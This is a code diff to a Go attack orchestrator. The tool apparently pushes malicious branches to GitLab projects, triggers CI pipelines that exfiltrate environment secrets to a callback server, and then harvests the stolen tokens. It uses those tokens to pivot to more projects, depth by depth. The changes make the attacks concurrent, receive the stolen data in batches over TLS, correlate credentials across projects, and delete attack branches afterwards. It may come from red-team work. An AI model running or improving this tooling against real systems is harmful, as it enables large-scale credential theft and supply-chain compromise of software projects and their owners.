@@ -6,7 +6,9 @@ import (
 	"crypto/x509"
 	"encoding/pem"
 	"fmt"
+	"log/slog"
 	"os"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -28,6 +30,7 @@ type PivotStats struct {
 	MaxDepthReached    int           `json:"max_depth_reached"`
 	Duration           time.Duration `json:"duration_ms"`
 	ExploitableTargets int           `json:"exploitable_targets"`
+	Correlations       []Correlation `json:"correlations,omitempty"`
 }
 
 // ExfilEntry represents a single exfiltrated key/value pair with source context.
@@ -93,7 +96,7 @@ func (o *Orchestrator) Run(ctx context.Context) (*PivotStats, error) {
 	if !o.opts.DryRun {
 		o.callback = NewCallbackServer(privKey, 100)
 		go func() {
-			if err := o.callback.Start(ctx, o.opts.ListenAddr); err != nil {
+			if err := o.callback.StartTLS(ctx, o.opts.ListenAddr, o.opts.TLSCertFile, o.opts.TLSKeyFile); err != nil {
 				o.emit(PivotEvent{Type: "error", Message: "callback server: " + err.Error()})
 			}
 		}()
@@ -116,11 +119,12 @@ func (o *Orchestrator) Run(ctx context.Context) (*PivotStats, error) {
 	credQueue := []*Credential{initialCred}
 	var totalAttacked int32
 
+	slog.Info("pivot loop starting", "max_depth", o.opts.MaxDepth, "targets", len(o.opts.InitialTargets), "dry_run", o.opts.DryRun)
 	for depth := 0; depth < o.opts.MaxDepth && len(credQueue) > 0; depth++ {
 		o.emit(PivotEvent{Type: "depth_start", Depth: depth, Message: fmt.Sprintf("starting depth %d with %d credential(s)", depth, len(credQueue))})
 		nextQueue := o.processDepth(ctx, credQueue, pubPEM, depth, &totalAttacked)
-		o.stats.MaxDepthReached = depth + 1
-		o.emit(PivotEvent{Type: "depth_end", Depth: depth, Message: fmt.Sprintf("completed depth %d", depth)})
+		o.stats.MaxDepthReached = depth
+		o.emit(PivotEvent{Type: "depth_end", Depth: depth, Message: fmt.Sprintf("completed depth %d, harvested %d new credential(s)", depth, len(nextQueue))})
 		credQueue = nextQueue
 	}
 
@@ -133,11 +137,14 @@ func (o *Orchestrator) Run(ctx context.Context) (*PivotStats, error) {
 		}
 	}
 	o.stats.CredentialsValid = validCount
+	o.stats.Correlations = CorrelateCredentials(o.creds)
 	o.stats.Duration = time.Since(start)
+	slog.Info("pivot loop complete", "depth_reached", o.stats.MaxDepthReached, "attacked", o.stats.ProjectsAttacked, "credentials_found", o.stats.CredentialsFound, "valid", o.stats.CredentialsValid, "duration", o.stats.Duration)
 	return &o.stats, nil
 }
 
 func (o *Orchestrator) processDepth(ctx context.Context, credQueue []*Credential, pubPEM string, depth int, totalAttacked *int32) []*Credential {
+	SortByAccessLevel(credQueue)
 	var nextQueue []*Credential
 	for _, cred := range credQueue {
 		if ctx.Err() != nil {
@@ -165,7 +172,19 @@ func (o *Orchestrator) processDepth(ctx context.Context, credQueue []*Credential
 }
 
 func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client, cred *Credential, targets []ExploitableTarget, pubPEM string, depth int, totalAttacked *int32) []*Credential {
-	var harvested []*Credential
+	// Phase 1: Launch attacks concurrently, bounded by AttackConcurrency.
+	type attackedTarget struct {
+		target      ExploitableTarget
+		pipelineURL string
+	}
+
+	var (
+		attacked []attackedTarget
+		mu       sync.Mutex
+		wg       sync.WaitGroup
+		sem      = make(chan struct{}, o.opts.AttackConcurrency)
+	)
+
 	for _, target := range targets {
 		if ctx.Err() != nil || int(atomic.LoadInt32(totalAttacked)) >= o.opts.MaxTargets {
 			break
@@ -175,30 +194,67 @@ func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client,
 		}
 		o.creds.MarkVisited(cred.TokenHash, target.ProjectID)
 
-		pipelineURL, err := o.attackTarget(ctx, cl, target, pubPEM)
-		if err != nil {
-			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("attack %s: %v", target.Path, err)})
-			continue
-		}
-		atomic.AddInt32(totalAttacked, 1)
-		o.emit(PivotEvent{Type: "attack", Depth: depth, Message: fmt.Sprintf("attacked %s -> %s", target.Path, pipelineURL)})
-
-		payload, err := o.callback.Receive(ctx, 5*time.Minute)
-		if err != nil {
-			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("receive from %s: %v", target.Path, err)})
-			continue
+		if o.opts.AttackDelay > 0 {
+			time.Sleep(o.opts.AttackDelay)
 		}
 
-		// Store all exfiltrated env vars
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(t ExploitableTarget) {
+			defer wg.Done()
+			defer func() { <-sem }()
+
+			pipelineURL, err := o.attackTarget(ctx, cl, t, pubPEM)
+			if err != nil {
+				o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("attack %s: %v", t.Path, err)})
+				return
+			}
+			atomic.AddInt32(totalAttacked, 1)
+			o.emit(PivotEvent{Type: "attack", Depth: depth, Message: fmt.Sprintf("attacked %s -> %s", t.Path, pipelineURL)})
+
+			mu.Lock()
+			attacked = append(attacked, attackedTarget{target: t, pipelineURL: pipelineURL})
+			mu.Unlock()
+		}(target)
+	}
+	wg.Wait()
+
+	if len(attacked) == 0 {
+		return nil
+	}
+
+	// Phase 2: Batch-receive all callbacks with a single deadline.
+	payloads, _ := o.callback.ReceiveAll(ctx, o.opts.ReceiveTimeout, len(attacked))
+
+	// Build lookup from project path to target for correlation.
+	pathIndex := make(map[string]ExploitableTarget, len(attacked))
+	for _, at := range attacked {
+		pathIndex[at.target.Path] = at.target
+	}
+
+	slog.Debug("processing callbacks", "received", len(payloads), "expected", len(attacked))
+	var harvested []*Credential
+	for i, payload := range payloads {
+		target, ok := pathIndex[payload.Project]
+		if !ok {
+			// Concurrent callbacks have no stable order. Never attribute secrets
+			// to a target by slice position when the project identifier is absent
+			// or does not match an attacked target.
+			slog.Debug("skipping unmatched callback payload", "index", i, "project", payload.Project)
+			continue
+		}
 		o.storeExfilData(payload.Secrets, target, depth)
-
 		harvested = append(harvested, o.harvestTokens(ctx, payload, target, depth)...)
+	}
 
-		if o.opts.Cleanup {
-			att := attack.NewAttacker(cl, o.gitlabURL, "", "", 30*time.Second)
-			_ = att.DeleteBranch(ctx, target.ProjectID, o.opts.AttackBranch)
+	// Phase 3: Cleanup attack branches if requested.
+	if o.opts.Cleanup {
+		att := attack.NewAttacker(cl, o.gitlabURL, "", "", 30*time.Second)
+		for _, at := range attacked {
+			_ = att.DeleteBranch(ctx, at.target.ProjectID, o.opts.AttackBranch)
 		}
 	}
+
 	return harvested
 }
 
@@ -222,6 +278,7 @@ func (o *Orchestrator) harvestTokens(ctx context.Context, payload *ExfilPayload,
 		validated.Depth = tok.Depth
 
 		o.creds.Add(validated)
+		o.creds.RecordTokenProject(validated.TokenHash, target.ProjectID)
 		o.emit(PivotEvent{Type: "credential", Depth: depth, Message: fmt.Sprintf("harvested %s token from %s (%s)", validated.TokenType, tok.SourceKey, target.Path)})
 
 		if validated.IsValid {
@@ -402,36 +459,13 @@ func (o *Orchestrator) emit(event PivotEvent) {
 
 func splitTags(tags string) []string {
 	var out []string
-	for _, t := range splitByComma(tags) {
-		t = trimSpace(t)
+	for t := range strings.SplitSeq(tags, ",") {
+		t = strings.TrimSpace(t)
 		if t != "" {
 			out = append(out, t)
 		}
 	}
 	return out
-}
-
-func splitByComma(s string) []string {
-	var out []string
-	start := 0
-	for i := range s {
-		if s[i] == ',' {
-			out = append(out, s[start:i])
-			start = i + 1
-		}
-	}
-	out = append(out, s[start:])
-	return out
-}
-
-func trimSpace(s string) string {
-	for len(s) > 0 && (s[0] == ' ' || s[0] == '\t') {
-		s = s[1:]
-	}
-	for len(s) > 0 && (s[len(s)-1] == ' ' || s[len(s)-1] == '\t') {
-		s = s[:len(s)-1]
-	}
-	return s
 }
 
 // Credentials returns the credential store for external access (e.g., store integration).
